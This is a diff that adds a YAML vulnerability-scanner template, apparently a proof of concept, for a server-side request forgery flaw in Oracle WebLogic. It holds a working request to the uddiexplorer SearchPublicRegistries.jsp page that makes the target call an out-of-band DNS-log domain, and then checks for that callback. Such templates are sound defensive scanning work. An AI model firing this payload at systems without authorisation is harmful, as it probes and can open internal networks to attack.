@@ -1,0 +1,17 @@
+id: poc-yaml-weblogic-ssrf
+info:
+  name: Weblogic 服务端请求伪造漏洞
+  severity: medium
+  tags:
+  - ssrf
+  finger: Weblogic
+  reference: []
+  description: null
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: GET
+  path: /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://{{.domain}}
+  expression: status_code == 200 && reverse.Verify()
+transport: http
